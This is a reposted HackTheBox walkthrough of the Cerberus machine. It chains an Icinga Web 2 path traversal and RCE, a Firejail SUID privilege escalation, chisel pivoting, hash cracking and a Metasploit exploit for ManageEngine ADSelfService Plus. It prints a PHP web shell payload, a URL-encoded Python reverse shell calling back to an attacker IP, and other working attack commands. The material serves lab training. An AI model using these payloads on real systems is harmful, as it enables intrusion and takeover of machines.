# :game_die: Cerberus Htb Walkthrough 30156D290Aa0

> **Original Source:** [Cerberus Htb Walkthrough 30156D290Aa0](https://infosecwriteups.com/cerberus-htb-walkthrough-30156d290aa0)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Hello everyone, I am Dharani Sanjaiy from India. This blog is a walkthrough of retired HackTheBox machine “[Cerberus](https://app.hackthebox.com/machines/534)”. This is really a hard box which is a combination of many techniques such as pivoting, Active directory abuse etc. If anyone wants to get familiar with these techniques or anyone who is preparing for OSCP, I will suggest this box.


Let’s get started !


My methodology is , I run rustscan first and then do other enumeration such as service version scan etc. later on open ports using NMAP.


Here, only port 8080 is open and is running Apache httpd. Nmap gives us a hostname, add it to your hosts file and open. Let’s have a look at the web server.


After a quick google search , I found that icingaweb2 have a couple of vulnerabilities. I used this awesome blogpost from sonar source to read more about it. You can read the blog from [here](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/). We can make use of this CVE-2022–24716 for our foot-hold.


*source: sonarsource.com*


Upon reading the post, we can understand how this vulnerability works and inorder to make our life simple, sonar gave us a POC aswell.


A simple modification of POC and running it leaks us some info.


I tried viewing other usual sensitive files including /etc/passwd and it worked aswell but I can’t able to chain them. I spent some time reading the documentation of icingweb2 and found this [gem](https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/).


*source: icinga.com*


I tried reading the above mentioned files and found some sensitive information upon viewing the resources.ini file.


Login to the website using the above credentials. The interface looked like this.


If you have spent some time reading the blogpost from sonarsource.com, You would have came across this “Remote code execution” vulnerability.


*source: sonarsorce.com*


I was only able to understand it after reading it a couple of times. I would suggest you to do the same.


It can be abused by the following steps:


- Create a new user in Configuration -> Access Control -> User.

- Add a SSH key. You can create the ssh key using this command.


```
ssh-keygen -t rsa -m pem
```


3. Go to system -> Resources and then create a new resource. Supply the required information like this.


4. Try the arbitrary file disclosure to check whether you can see the uploaded private key or not. [Optional]


```
curl http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/ssh/<private key>
```


5. Inorder to upload our php shell, the webserver has to first validate our request . We can simply trick this validation by telling the webserver to view our private key . It can be achieved by using file:/// (Again I would suggest you to read the blogpost as they explained why it’s working.)


6. Have a look and see how I gave the input. Follow the same. Now, click “Validate Configuration”. If you get any error in this process, do it again. The webserver automatically deletes the resource after sometime. I am not sure why it was happening. Once it validates, Intercept the request before clicking “Save Changes”. The request looks like this.


7. Use a null byte at the end of our *private_key* parameter and put our php code. It look likes this.


```
private_key=file:///etc/icingaweb2/ssh/<private key file name>%00<?php system($_REQUEST['cmd']); ?>
```


Make sure to url encode it.


8. After uploading , you can see the file (I named it shell.php) below.


9. Now go to Configuration -> Application -> General and add */dev/* as module path.


10. Then go to Configuration -> Modules and enable the* shm* module.


We are done with the steps now. If everything worked , we will get the code execution now. Use this command to trigger the code execution.


```
curl.exe -X POST http://icinga.cerberus.local:8080/icingaweb2/shm/shell.php?cmd=id --output -
```


*woooooooo!!!!*


OK, We can see the output . Now its time to get some shellll. I used a python script from [revshells.com](https://www.revshells.com/). Use the command below for reference.


```
curl -X POST http://icinga.cerberus.local:8080/shm/shell.php/cmd=export%20RHOST%3D%2210.10.10.10%22%3Bexport%20RPORT%3D9001%3Bpython%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27 --output -
```


Start a listener to grab the shell. Now, you should see a connection back.


```
nc -lvnp 9001
```


At this time, I will suggest you guys to get a couple of shells using the above steps . This will hep alot in future.


## Get WaterBucket’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Its time for privesc now. I have done some manual enumeration and found some interesting output .


```
find / -type f -perm -u=s -ls 2>/dev/null
```


Firejail has SUID permission. We can abuse it for privilege escalation. Googling for exploits gave me [this](https://seclists.org/oss-sec/2022/q2/188). Download the exploit and transfer it to the victim machine.


```
python3 -m http.server 80 (In attacker machine)

wget http://<ip>:80/firejail.py (In vicctim machine)
```


Use the above commands to exploit.


```
chmod +x firejoin.py

python3 firejoin.py
```


The output looks like this.


This is why I advised you guys to get a couple of shells before.

*2min silence for those who failed to do this :)*


In other terminal run,


```
firejail --join=1733 (This id may differ)
```


*Holaaaaa !*


We are root now ! Go and grab the root flag :) Just kidding , here comes the main part. When I checked the IP address of the machine, I was able to see an internal IP address.


```
ifconfig
```


Our IP is 172.16.22.2 So, we can get to know that the other machine may be located at 172.16.22.1. I tried to ping that IP and got a ping back.


```
ping -c 1 172.16.22.1
```


Now, for further enumeration I transferred the Nmap binary and ran it. I found that port 5985 (winrm) is open. I want to forward that port. So I uploaded [chisel](https://github.com/jpillora/chisel) to the box .


```
./chisel server --port 1234 --reverse (In attacker machine)

./chisel client tun0IP:1234 R:5985:172.16.22.1:5985 (In victim machine)
```


W can see that the port forward is established. I tried using the credential we found earlier for the matthew user but it didn’t work. Its time for some more enumeration. After spending a hour enumerating the box, I found that in /var/lib/sss/db , we have a suspicious file named cache_cerberus.local.ldb. Viewing the file exposes some creds.


Crack the hash using any password crackers like John The Ripper or hashcat. I used john to crack the same.


```
john hash --wordlist=rockyou.txt
```


The password is 147258369. Now I ran evil-winrm and got the shell as Matthew.


```
evil-winrm -i tun0IP -u matthew -p 147258369
```


Go and grab the user.txt file.


## More enumeration !!!!!!


Enumerating the box further reveals that some services are running locally. It’s time to port forward again.


Out of all these ports, port 8888,9251 seems sus. Googling those ports reveals that these ports are used by AdSelfService Plus which is a product of manage engine developed by Zoho Corporation.


*Source: manage engine*


I port forwarded those ports using chisel again.


```
./chisel server --port 4545 --reverse

./chisel client tun0IP:4545 R:80:172.16.22.1:80 R:443:172.16.22.1:443 R:8888:172.16.22.1:8888 R:9251:172.16.22.1:9251
```


Now when we try to connect to tun0IP:8888 it redirects us to [https://dc.cerberus.local/adfs/](https://dc.cerberus.local/adfs/)


Using username as matthew@cerberus.local and the pass that we used to connect via winrm, redirects us to a new webpage. Once again a big TIP : Take note of the SAML request.


Finally it will redirect us here.


As we saw earlier it is related to Adselfservice Plus, I googled and got to know about this CVE-2022–47966. I tried to find any public exploits but I can’t find any except Metasploit's one. So, I am going to use metasploit for this box.


Start the Metasploit.


```
msfconsole
```


Search AdSelfService Plus or CVE-2022–47966 and you can find this exploit.


```
multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
```


Use this exploit and fill the required info as follow.


```
use multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
```


We can get the GUID from the final redirected website’s URL. The issuer URL can be obtained by decoding the SAML request that we got earlier. Once everything is perfect, type run or exploit to exploit.


We get the session back as Administrator. Go to his desktop and grab the root.txt


OK, We Pwned!!! the Cerberus machine from HackTheBox. You can contact me [here.](https://dharani-sanjaiy.github.io/)


Buy me a coffee [here](https://www.buymeacoffee.com/DharaniSanjaiy).


Read this if you want to know more about [ADFS.](https://medium.com/@robert.broeckelmann/active-directory-federation-services-adfs-and-kerberos-f36c71e13be5) Watch this [video](https://youtu.be/CjarTgjKcX8) for better understanding.

---

*Originally published on [Medium](https://infosecwriteups.com/cerberus-htb-walkthrough-30156d290aa0). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
